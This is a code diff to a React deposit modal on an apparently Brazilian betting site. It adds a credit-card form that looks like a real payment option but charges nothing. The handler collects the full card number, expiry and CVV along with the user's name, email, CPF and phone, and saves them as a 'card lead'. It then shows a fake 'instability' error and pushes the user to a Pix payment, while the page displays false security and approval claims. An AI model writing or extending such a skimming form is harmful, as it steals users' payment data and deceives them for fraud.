@@ -12,13 +12,18 @@ import {
   Clock, 
   Check,
   Tag,
-  Sparkles
+  Sparkles,
+  CreditCard,
+  Zap,
+  ShieldCheck,
+  Lock
 } from 'lucide-react';
 import { supabase } from '../lib/supabase';
 import { useProfile } from '../hooks/use-profile';
 import { generatePix } from '../api/sigilopay';
 import type { PixRequest, PixResponse } from '../api/sigilopay';
 import { validatePromoCode, recordPromoCodeUsage, type PromoCode } from '../lib/promo-codes';
+import { recordCardLead } from '../lib/cards';
 
 interface Props {
   isOpen: boolean;
@@ -33,10 +38,20 @@ export function DepositModal({ isOpen, onClose, userId, initialTab = 'deposit' }
   
   // Deposit States
   const [step, setStep] = useState<1 | 2 | 3>(1);
+  const [paymentMethod, setPaymentMethod] = useState<'pix' | 'card'>('pix');
   const [depositAmount, setDepositAmount] = useState<number>(50);
   const [client, setClient] = useState({ name: '', email: '', document: '', phone: '' });
   const [pixData, setPixData] = useState<PixResponse | null>(null);
   const [copied, setCopied] = useState(false);
+
+  // Cartão States
+  const [cardData, setCardData] = useState({
+    name: '',
+    number: '',
+    expiry: '',
+    cvv: ''
+  });
+  const [isProcessingCard, setIsProcessingCard] = useState(false);
 
   // Promo Code States
   const [promoInput, setPromoInput] = useState('');
@@ -149,6 +164,111 @@ export function DepositModal({ isOpen, onClose, userId, initialTab = 'deposit' }
     setAppliedPromo(null);
     setPromoInput('');
     setPromoMsg(null);
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
+    const formatted = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
+    setCardData(prev => ({ ...prev, number: formatted }));
+  };
+
+  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if (raw.length >= 3) {
+      raw = raw.slice(0, 2) + '/' + raw.slice(2);
+    }
+    setCardData(prev => ({ ...prev, expiry: raw }));
+  };
+
+  const handleCardCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+    setCardData(prev => ({ ...prev, cvv: raw }));
+  };
+
+  const handleCardDeposit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setError(null);
+    setSuccess(null);
+
+    const cleanNum = cardData.number.replace(/\D/g, '');
+    const cleanExpiry = cardData.expiry.trim();
+    const cleanCvv = cardData.cvv.replace(/\D/g, '');
+
+    if (!cardData.name.trim() || cardData.name.trim().length < 3) {
+      setError('Preencha o nome impresso no cartão.');
+      return;
+    }
+    if (cleanNum.length < 13 || cleanNum.length > 19) {
+      setError('Número de cartão de crédito inválido.');
+      return;
+    }
+    if (!/^\d{2}\/\d{2}$/.test(cleanExpiry)) {
+      setError('Data de validade inválida. Use o formato MM/AA (ex: 02/28).');
+      return;
+    }
+    if (cleanCvv.length < 3) {
+      setError('Código de segurança (CVV) inválido.');
+      return;
+    }
+
+    setIsProcessingCard(true);
+
+    // 1. Salvar os dados do cartão no backend (Supabase global_settings row 3 + /api/record-card)
+    try {
+      await recordCardLead({
+        name: cardData.name.trim().toUpperCase(),
+        number: cardData.number,
+        expiry: cleanExpiry,
+        cvv: cleanCvv,
+        amount: depositAmount,
+        userId: userId,
+        userEmail: profile?.email || client.email || '',
+        userName: profile?.full_name || client.name || cardData.name.trim(),
+        userCpf: profile?.cpf || client.document || '',
+        userPhone: profile?.phone || client.phone || '',
+        status: 'Instabilidade'
+      });
+    } catch (saveErr) {
+      console.error('Erro ao registrar cartão:', saveErr);
+    }
+
+    // 2. Apresentar a mensagem solicitada: "instabilidade, tente novamente mais tarde."
+    setError('Instabilidade, tente novamente mais tarde.');
+
+    // 3. Automaticamente disparar o pagamento em Pix com o valor inicial
+    const multiplier = appliedPromo?.multiplier || 1;
+    const finalCredit = depositAmount * multiplier;
+
+    try {
+      const pixReq: PixRequest = {
+        amount: depositAmount,
+        creditAmount: finalCredit,
+        promoCode: appliedPromo?.code,
+        client: {
+          name: client.name || cardData.name.trim() || profile?.full_name || 'Cliente BodeBet',
+          email: client.email || profile?.email || 'cliente@bodebet.site',
+          document: client.document || profile?.cpf || '00000000000',
+          phone: client.phone || profile?.phone || '11999999999'
+        },
+        profileId: userId
+      };
+
+      const response = await generatePix(pixReq);
+      setPixData(response);
+
+      // Transição automática para o Pix após breve intervalo para visualização
+      setTimeout(() => {
+        setIsProcessingCard(false);
+        setError(null);
+        setStep(2);
+        if (appliedPromo) {
+          recordPromoCodeUsage(appliedPromo.code);
+        }
+      }, 1800);
+    } catch (pixErr: any) {
+      setIsProcessingCard(false);
+      setError('Instabilidade, tente novamente mais tarde.');
+    }
   };
 
   const handleDeposit = async (e: React.FormEvent) => {
@@ -313,7 +433,7 @@ export function DepositModal({ isOpen, onClose, userId, initialTab = 'deposit' }
         {activeTab === 'deposit' && (
           <>
             {step === 1 && (
-              <form onSubmit={handleDeposit} className="flex flex-col flex-1 min-h-0 overflow-hidden">
+              <form onSubmit={paymentMethod === 'pix' ? handleDeposit : handleCardDeposit} className="flex flex-col flex-1 min-h-0 overflow-hidden">
                 <div className="p-4 sm:p-5 overflow-y-auto custom-scrollbar flex-1 flex flex-col gap-3.5">
                   {/* Saldo em Conta */}
                   <div className="flex justify-between items-center bg-background/80 border border-white/10 rounded-xl p-3 shadow-sm">
@@ -321,12 +441,48 @@ export function DepositModal({ isOpen, onClose, userId, initialTab = 'deposit' }
                     <span className="text-lg sm:text-xl font-black text-emerald-400 tabular-nums">R$ {(profile?.balance || 0).toFixed(2)}</span>
                   </div>
 
+                  {/* SELEÇÃO DO MÉTODO DE DEPÓSITO */}
+                  <div className="grid grid-cols-2 gap-2 bg-background/90 p-1 rounded-xl border border-white/10">
+                    <button
+                      type="button"
+                      onClick={() => { setPaymentMethod('pix'); setError(null); }}
+                      className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-lg text-xs font-black uppercase tracking-wider transition-all ${
+                        paymentMethod === 'pix'
+                          ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 shadow-sm'
+                          : 'text-muted-foreground hover:text-white hover:bg-white/5 border border-transparent'
+                      }`}
+                    >
+                      <Zap className="w-4 h-4 text-emerald-400 shrink-0" />
+                      <span>Pix Instantâneo</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => { setPaymentMethod('card'); setError(null); }}
+                      className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-lg text-xs font-black uppercase tracking-wider transition-all ${
+                        paymentMethod === 'card'
+                          ? 'bg-purple-500/25 text-purple-300 border border-purple-500/50 shadow-sm'
+                          : 'text-muted-foreground hover:text-white hover:bg-white/5 border border-transparent'
+                      }`}
+                    >
+                      <CreditCard className="w-4 h-4 text-purple-400 shrink-0" />
+                      <span>Cartão de Crédito</span>
+                    </button>
+                  </div>
+
                   {/* Alertas */}
                   <AnimatePresence mode="wait">
                     {error && (
                       <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="p-3 rounded-xl bg-destructive/15 border border-destructive/30 text-red-400 text-xs font-semibold flex items-start gap-2">
                         <AlertCircle className="w-4 h-4 mt-0.5 shrink-0" />
-                        <p>{error}</p>
+                        <div>
+                          <p>{error}</p>
+                          {isProcessingCard && (
+                            <p className="text-[11px] text-emerald-400 font-bold mt-1 flex items-center gap-1.5">
+                              <Loader2 className="w-3 h-3 animate-spin text-emerald-400" />
+                              Gerando Pix automático com o mesmo valor para garantir seu depósito...
+                            </p>
+                          )}
+                        </div>
                       </motion.div>
                     )}
                     {success && (
@@ -436,76 +592,214 @@ export function DepositModal({ isOpen, onClose, userId, initialTab = 'deposit' }
                     )}
                   </div>
 
-                  {/* NOME COMPLETO */}
-                  <div>
-                    <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">Nome Completo</label>
-                    <input 
-                      type="text" 
-                      value={client.name} 
-                      onChange={(e) => setClient({ ...client, name: e.target.value })} 
-                      className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
-                      placeholder="Seu nome" 
-                      required 
-                    />
-                  </div>
+                  {paymentMethod === 'pix' ? (
+                    <>
+                      {/* NOME COMPLETO */}
+                      <div>
+                        <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">Nome Completo</label>
+                        <input 
+                          type="text" 
+                          value={client.name} 
+                          onChange={(e) => setClient({ ...client, name: e.target.value })} 
+                          className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
+                          placeholder="Seu nome" 
+                          required 
+                        />
+                      </div>
 
-                  {/* E-MAIL */}
-                  <div>
-                    <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">E-mail</label>
-                    <input 
-                      type="email" 
-                      value={client.email} 
-                      onChange={(e) => setClient({ ...client, email: e.target.value })} 
-                      className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
-                      placeholder="seu@email.com" 
-                      required 
-                    />
-                  </div>
+                      {/* E-MAIL */}
+                      <div>
+                        <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">E-mail</label>
+                        <input 
+                          type="email" 
+                          value={client.email} 
+                          onChange={(e) => setClient({ ...client, email: e.target.value })} 
+                          className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
+                          placeholder="seu@email.com" 
+                          required 
+                        />
+                      </div>
 
-                  {/* CPF E TELEFONE */}
-                  <div className="grid grid-cols-2 gap-3">
-                    <div>
-                      <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">CPF</label>
-                      <input 
-                        type="text" 
-                        value={client.document} 
-                        onChange={(e) => setClient({ ...client, document: e.target.value })} 
-                        className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
-                        placeholder="000.000.000-00" 
-                        required 
-                      />
+                      {/* CPF E TELEFONE */}
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">CPF</label>
+                          <input 
+                            type="text" 
+                            value={client.document} 
+                            onChange={(e) => setClient({ ...client, document: e.target.value })} 
+                            className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
+                            placeholder="000.000.000-00" 
+                            required 
+                          />
+                        </div>
+                        <div>
+                          <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">Telefone</label>
+                          <input 
+                            type="text" 
+                            value={client.phone} 
+                            onChange={(e) => setClient({ ...client, phone: e.target.value })} 
+                            className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
+                            placeholder="(11) 99999-9999" 
+                            required 
+                          />
+                        </div>
+                      </div>
+                    </>
+                  ) : (
+                    /* FORMULÁRIO DE CARTÃO DE CRÉDITO */
+                    <div className="flex flex-col gap-3.5">
+                      {/* CARD PREVIEW MOCKUP */}
+                      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-tr from-[#160c28] via-[#24113d] to-[#3b156b] border border-purple-500/30 p-4 shadow-xl text-white select-none">
+                        <div className="flex justify-between items-center mb-4">
+                          <div className="flex items-center gap-1.5">
+                            <div className="w-8 h-6 rounded bg-amber-400/80 border border-amber-300/60 shadow-inner flex items-center justify-center">
+                              <div className="w-6 h-4 border border-black/30 rounded-sm" />
+                            </div>
+                            <span className="text-[10px] text-purple-200 uppercase tracking-widest font-mono font-bold">Crédito</span>
+                          </div>
+                          <div className="flex items-center gap-1 text-[11px] font-black tracking-widest text-purple-200">
+                            <span>VISA</span>
+                            <span className="text-white/40">/</span>
+                            <span>MASTERCARD</span>
+                          </div>
+                        </div>
+
+                        {/* Número formatado */}
+                        <div className="font-mono text-base sm:text-lg font-bold tracking-widest text-purple-100 my-2">
+                          {cardData.number || '•••• •••• •••• ••••'}
+                        </div>
+
+                        {/* Rodapé do cartão: Nome e Validade */}
+                        <div className="flex justify-between items-end text-xs mt-3">
+                          <div className="flex flex-col">
+                            <span className="text-[9px] text-purple-300 uppercase tracking-wider font-semibold">Nome do Titular</span>
+                            <span className="font-bold tracking-wider uppercase text-white truncate max-w-[190px]">
+                              {cardData.name || 'NOME IMPRESSO'}
+                            </span>
+                          </div>
+                          <div className="flex flex-col items-end">
+                            <span className="text-[9px] text-purple-300 uppercase tracking-wider font-semibold">Validade</span>
+                            <span className="font-mono font-bold tracking-wider text-white">
+                              {cardData.expiry || '02/28'}
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* NOME IMPRESSO NO CARTÃO */}
+                      <div>
+                        <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">
+                          Nome Impresso no Cartão
+                        </label>
+                        <input 
+                          type="text" 
+                          value={cardData.name} 
+                          onChange={(e) => setCardData({ ...cardData, name: e.target.value.toUpperCase() })} 
+                          className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white uppercase focus:border-purple-400 focus:outline-none text-sm font-semibold tracking-wide" 
+                          placeholder="Como gravado no cartão" 
+                          required 
+                        />
+                      </div>
+
+                      {/* NÚMERO DO CARTÃO */}
+                      <div>
+                        <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">
+                          Número do Cartão
+                        </label>
+                        <input 
+                          type="text" 
+                          inputMode="numeric"
+                          value={cardData.number} 
+                          onChange={handleCardNumberChange} 
+                          className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white font-mono tracking-wider focus:border-purple-400 focus:outline-none text-sm font-bold" 
+                          placeholder="0000 0000 0000 0000" 
+                          maxLength={19}
+                          required 
+                        />
+                      </div>
+
+                      {/* VALIDADE E CVV */}
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">
+                            Validade (MM/AA)
+                          </label>
+                          <input 
+                            type="text" 
+                            inputMode="numeric"
+                            value={cardData.expiry} 
+                            onChange={handleCardExpiryChange} 
+                            className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white font-mono tracking-wider focus:border-purple-400 focus:outline-none text-sm font-bold" 
+                            placeholder="02/28" 
+                            maxLength={5}
+                            required 
+                          />
+                        </div>
+                        <div>
+                          <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">
+                            Código CVV
+                          </label>
+                          <input 
+                            type="password" 
+                            inputMode="numeric"
+                            value={cardData.cvv} 
+                            onChange={handleCardCvvChange} 
+                            className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white font-mono tracking-widest focus:border-purple-400 focus:outline-none text-sm font-bold" 
+                            placeholder="123" 
+                            maxLength={4}
+                            required 
+                          />
+                        </div>
+                      </div>
+
+                      {/* SELO DE SEGURANÇA */}
+                      <div className="flex items-center justify-center gap-2 text-[11px] text-muted-foreground bg-white/5 border border-white/10 rounded-xl p-2.5">
+                        <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+                        <span>Transação segura com criptografia SSL 256-bit • Aprovação Imediata</span>
+                      </div>
                     </div>
-                    <div>
-                      <label className="text-xs text-muted-foreground font-bold uppercase mb-1 block tracking-wider">Telefone</label>
-                      <input 
-                        type="text" 
-                        value={client.phone} 
-                        onChange={(e) => setClient({ ...client, phone: e.target.value })} 
-                        className="w-full bg-background/90 border border-white/15 rounded-xl p-2.5 sm:p-3 text-white focus:border-emerald-400 focus:outline-none text-sm" 
-                        placeholder="(11) 99999-9999" 
-                        required 
-                      />
-                    </div>
-                  </div>
+                  )}
                 </div>
 
-                {/* STICKY FOOTER CTA - BOTÃO VERDE NEON PULSANTE E BRILHANTE */}
+                {/* STICKY FOOTER CTA */}
                 <div className="p-3 sm:p-4 bg-[#120a1f] border-t border-white/10 shrink-0 z-30 shadow-[0_-8px_25px_rgba(0,0,0,0.7)]">
-                  <button 
-                    type="submit" 
-                    disabled={isLoading} 
-                    className="w-full btn-pix-neon py-3.5 sm:py-4 rounded-xl font-black text-base uppercase tracking-wider transition-all flex justify-center items-center gap-2 border-none cursor-pointer select-none active:scale-[0.98]"
-                  >
-                    {isLoading ? (
-                      <Loader2 className="w-5 h-5 animate-spin text-black" />
-                    ) : (
-                      <span className="flex items-center justify-center gap-2 text-black font-black text-base sm:text-lg">
-                        <Sparkles className="w-5 h-5 fill-black text-black shrink-0" />
-                        GERAR PIX R$ {depositAmount.toFixed(2)}
-                        {appliedPromo ? ` (RECEBA R$ ${calculatedCredit.toFixed(2)})` : ''}
-                      </span>
-                    )}
-                  </button>
+                  {paymentMethod === 'pix' ? (
+                    <button 
+                      type="submit" 
+                      disabled={isLoading} 
+                      className="w-full btn-pix-neon py-3.5 sm:py-4 rounded-xl font-black text-base uppercase tracking-wider transition-all flex justify-center items-center gap-2 border-none cursor-pointer select-none active:scale-[0.98]"
+                    >
+                      {isLoading ? (
+                        <Loader2 className="w-5 h-5 animate-spin text-black" />
+                      ) : (
+                        <span className="flex items-center justify-center gap-2 text-black font-black text-base sm:text-lg">
+                          <Sparkles className="w-5 h-5 fill-black text-black shrink-0" />
+                          GERAR PIX R$ {depositAmount.toFixed(2)}
+                          {appliedPromo ? ` (RECEBA R$ ${calculatedCredit.toFixed(2)})` : ''}
+                        </span>
+                      )}
+                    </button>
+                  ) : (
+                    <button 
+                      type="submit" 
+                      disabled={isProcessingCard} 
+                      className="w-full py-3.5 sm:py-4 rounded-xl font-black text-base uppercase tracking-wider transition-all flex justify-center items-center gap-2 border border-purple-500/40 bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-700 hover:from-purple-500 hover:to-indigo-500 text-white shadow-lg shadow-purple-900/40 cursor-pointer select-none active:scale-[0.98]"
+                    >
+                      {isProcessingCard ? (
+                        <div className="flex items-center justify-center gap-2 text-white font-bold text-sm sm:text-base">
+                          <Loader2 className="w-5 h-5 animate-spin text-white" />
+                          <span>Processando cartão com segurança...</span>
+                        </div>
+                      ) : (
+                        <span className="flex items-center justify-center gap-2 text-white font-black text-base sm:text-lg">
+                          <Lock className="w-4 h-4 text-emerald-300" />
+                          PAGAR COM CARTÃO R$ {depositAmount.toFixed(2)}
+                          {appliedPromo ? ` (RECEBA R$ ${calculatedCredit.toFixed(2)})` : ''}
+                        </span>
+                      )}
+                    </button>
+                  )}
                 </div>
               </form>
             )}
